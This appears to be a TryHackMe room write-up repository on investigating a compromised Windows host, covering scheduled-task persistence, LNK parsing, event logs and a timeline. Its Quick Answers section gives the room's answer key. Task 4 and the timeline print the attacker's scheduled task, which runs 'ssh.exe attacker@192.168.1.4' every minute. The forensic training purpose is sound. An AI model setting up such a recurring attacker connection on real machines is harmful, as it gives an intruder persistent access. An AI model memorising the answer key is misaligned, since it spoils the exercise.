# Compromised Windows Analysis — TryHackMe

> **Room:** Advanced Endpoint Investigations → Windows Endpoint Investigation → **Compromised Windows Analysis**
> **Difficulty:** easy · **Est. time:** 75 min
> **Case Date:** 2025-03-29
> **Author:** Mayank Pathak ([@MayankQuery](https://github.com/MayankQuery))

---

## Repository Structure

```
Compromised-Windows-Analysis/
├─ README.md
├─ Findings/
│  ├─ Summary.md
├─ Tasks/
│  ├─ Task01-Introduction.md
│  ├─ Task03-Timeline-Explorer.md
│  ├─ Task04-Scheduled-Tasks.md
│  ├─ Task05-LNK-Files.md
│  ├─ Task06-File-Execution.md
│  ├─ Task07-The-Dig-of-Executable.md
│  ├─ Task08-Windows-Event-Logs.md
│  └─ Task09-Chronological-Order.md
├─ Notes/
│  ├─ Investigation-Checklist.md
│  ├─ Artifact-Paths.md
│  └─ Commands-Cheatsheet.md
├─ Evidence/
│  ├─ Parsed-LNK.csv        (placeholder)
│  ├─ Timeline-View.csv     (placeholder)
│  ├─ Updater-Task.xml      (placeholder)
│  └─ .gitkeep
├─ Scripts/
│  ├─ export_scheduled_task.ps1
│  ├─ parse_recent_lnk_with_lecmd.cmd
│  └─ export_eventlogs_wevtutil.cmd
├─ .gitignore
└─ LICENSE
```

---

## Case Overview

**Scenario:** TKM’s junior security engineer observed repeated outbound SSH connection attempts from user **Aashir**’s workstation to a malicious IP address, triggered every minute. Windows Defender was found disabled. This repo documents the forensic workflow and findings.

**Key Learning Objectives**

* Identify attacker persistence via **Scheduled Tasks**
* Parse **LNK** shortcuts to uncover recently accessed items
* Attribute **file executions** and inspect **Windows Event Logs**
* Build an **attack timeline** and extract **IOCs**

---

## Quick Answers (Room Q\&A)

* **User whose system generated suspicious SSH traffic:** `Aashir`
* **Scheduled Task name created by attacker:** `Updater`
* **Malicious C2 IP (SSH target):** `192.168.1.4`
* **RAR filename created during attack:** `secrets.rar`
* **RAR file creation time:** `2022-09-30 10:27:20` (Target Created)

> These answers are justified in the detailed task write‑ups below and in `/Findings/`.

---

## How to Use This Repo

1. **Clone**

   ```bash
   git clone https://github.com/MayankQuery/Compromised-Windows-Analysis.git
   cd Compromised-Windows-Analysis
   ```
2. **Drop your artifacts** (XML, CSV, EVTX) into `/Evidence/`.
3. **Run helper scripts** from `/Scripts/` to export tasks and logs.
4. **Open the task write‑ups** in `/Tasks/` while you investigate.

---

## Tasks/Task01-Introduction.md

```markdown
# Task 1 — Introduction
**Case Date:** 2025-03-29  
**Victim User:** Aashir

Scope includes Windows persistence, recently accessed items, process/file execution evidence, Windows event logs, and timeline analysis.
```

---

## Tasks/Task03-Timeline-Explorer.md

```markdown
# Task 3 — Timeline Explorer for Visualization

**Tools:** Eric Zimmerman's Timeline Explorer  
**Artifacts:** CSV exports from LNK parsing, task XML timestamps, event logs

### Steps
1. Parse LNK files (see Task 5) to CSV.
2. Import CSV into **Timeline Explorer** and align on local time.
3. Correlate RAR and Scheduled Task creation windows.

### Outcome
- Confirmed RAR activity shortly before Scheduled Task creation.
```

---

## Tasks/Task04-Scheduled-Tasks.md

````markdown
# Task 4 — Investigating Persistence (Scheduled Tasks)

**Goal:** Identify persistence via Windows Task Scheduler.

### GUI Method
- Open **Task Scheduler** → `Task Scheduler Library`
- Inspect properties of suspicious task (e.g., **Updater**)
- Check **Actions** → `ssh.exe attacker@192.168.1.4` (example)

### Disk Method
- Navigate: `C:\\Windows\\System32\\Tasks\\`
- Open `Updater` (XML). Look for `<Exec><Command>` and `<Arguments>`

### CLI/Export
```powershell
# Export a task's XML to Evidence
$taskName = 'Updater'
$dest = "$(Resolve-Path .)\\Evidence\\Updater-Task.xml"
schtasks /query /tn $taskName /xml > $dest
````

### Findings

* **Malicious Task Name:** `Updater`
* **Action:** `C:\\Windows\\System32\\OpenSSH\\ssh.exe attacker@192.168.1.4`
* **Interval:** every 1 minute (trigger)

````

---

## Tasks/Task05-LNK-Files.md
```markdown
# Task 5 — Investigating Recently Accessed Files (LNK)

**Artifact Path:** `C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Recent Items`

### Parse LNK with LECmd
```cmd
cd "C:\\Users\\Administrator\\Desktop\\Forensics Tools\\LECmd"
LECmd.exe -d C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Recent --csvf Parsed-LNK.csv --csv C:\\Users\\Administrator\\Desktop
````

Move `Parsed-LNK.csv` to `/Evidence/`.

### Review in Timeline Explorer

* Columns of interest: **Target Created** (file), **Source Created** (LNK)

### Findings

* **RAR File Name:** `secrets.rar`
* **Target Created (file creation):** `2022-09-30 10:27:20`
* **Source Created (lnk creation):** `≈ 10:27:30`

````

---

## Tasks/Task06-File-Execution.md
```markdown
# Task 6 — Investigating File Execution

**Approaches:**
- Shimcache/Amcache (if provided)
- Prefetch (if enabled)
- SRUM/RecentFileCache.bcf (context dependent)
- Event Logs: `Microsoft-Windows-Security-Mitigations` and `Sysmon` (if present)

**Goal:** Link execution of ssh.exe and any staging/exfil tools.
````

---

## Tasks/Task07-The-Dig-of-Executable.md

```markdown
# Task 7 — The Dig of Executable

Investigate metadata & reputation for binaries observed (e.g., ssh.exe invocation chain, any droppers or scripts).  
Capture hashes, signer info, VT/OSINT (do not upload sensitive corp files externally unless approved).
```

---

## Tasks/Task08-Windows-Event-Logs.md

````markdown
# Task 8 — Windows Event Log Analysis

**Key IDs:**
- **4698** — Scheduled task created
- **4702** — Scheduled task updated
- **4688** — Process creation (CommandLine shows ssh target)
- **1102** — Audit log cleared (defense evasion)
- **7036** — Service state changes (defender-related)

### Export Examples
```cmd
wevtutil epl Security Evidence\Security.evtx /q:"*[System[(EventID=4698 or EventID=4702 or EventID=4688)]]"
wevtutil epl Microsoft-Windows-TaskScheduler/Operational Evidence\TaskScheduler.evtx
````

### What to Look For

* XML `EventData` → TaskName, Author, Command, Arguments
* Correlate timestamps with LNK & task creation

````

````
## Tasks/Task09-Chronological-Order.md

```markdown
# Task 9 — Chronological Order of Attack

1. **10:27:20** — `secrets.rar` created (user profile Recent Items LNK points to it)
2. **10:27:XX** — LNK created for the RAR (user interaction)
3. **10:29:00** — Scheduled Task `Updater` created to run every minute
4. Repeated **SSH attempts** to `192.168.1.4` observed and blocked
````

---

## Notes/Investigation-Checklist.md

```markdown
# Investigation Checklist (Windows)

- [ ] Acquire triage: Scheduled Tasks XML, Recent Items, Event Logs
- [ ] Identify persistence: Tasks, Run Keys, Services, WMI, Startup folders
- [ ] Parse LNK with LECmd → CSV → Timeline Explorer
- [ ] Export Task XML with `schtasks /query /xml`
- [ ] Export relevant Event Logs (4698, 4702, 4688, 1102)
- [ ] Extract IOCs → `/Findings/Indicators.csv`
- [ ] Build Timeline → `/Findings/Summary.md`
- [ ] Mitigation & validation steps documented
```

---

## Notes/Artifact-Paths.md

```markdown
# Artifact Paths (Windows)

- Tasks (disk): `C:\\Windows\\System32\\Tasks\\*`
- Task Scheduler Logs: `Applications and Services Logs/Microsoft/Windows/TaskScheduler/Operational`
- LNK Shortcuts: `C:\\Users\\<User>\\AppData\\Roaming\\Microsoft\\Windows\\Recent Items\\*`
- Defender status & logs: `Microsoft-Windows-Windows Defender/Operational`
```

---

## Notes/Commands-Cheatsheet.md

```markdown
# Commands Cheatsheet

# Export a specific scheduled task
schtasks /query /tn "Updater" /xml > Evidence\Updater-Task.xml

# List all tasks with last run time and next run
schtasks /query /fo LIST /v > Evidence\All-Tasks-Verbose.txt

# Wevtutil selective export
wevtutil epl Security Evidence\Security.evtx /q:"*[System[(EventID=4698 or EventID=4702 or EventID=4688)]]"
wevtutil epl Microsoft-Windows-TaskScheduler/Operational Evidence\TaskScheduler.evtx
```

---

## Scripts/export\_scheduled\_task.ps1

```powershell
param(
  [string]$TaskName = 'Updater',
  [string]$OutFile = "$(Resolve-Path ..)\\Evidence\\Updater-Task.xml"
)

schtasks /query /tn $TaskName /xml > $OutFile
Write-Host "Exported $TaskName to $OutFile"
```

---

## Scripts/parse\_recent\_lnk\_with\_lecmd.cmd

```bat
@echo off
set LECMD_DIR="C:\\Users\\Administrator\\Desktop\\Forensics Tools\\LECmd"
set RECENT_DIR="C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Recent"
set OUTCSV="%cd%\\..\\Evidence\\Parsed-LNK.csv"

pushd %LECMD_DIR%
LECmd.exe -d %RECENT_DIR% --csvf Parsed-LNK.csv --csv "%cd%"
move /Y Parsed-LNK.csv %OUTCSV%
popd

echo LNK parsed to %OUTCSV%
```

---

## Scripts/export\_eventlogs\_wevtutil.cmd

```bat
@echo off
mkdir ..\Evidence 2>nul
wevtutil epl Security ..\Evidence\Security.evtx /q:"*[System[(EventID=4698 or EventID=4702 or EventID=4688 or EventID=1102)]]"
wevtutil epl Microsoft-Windows-TaskScheduler/Operational ..\Evidence\TaskScheduler.evtx
```

---
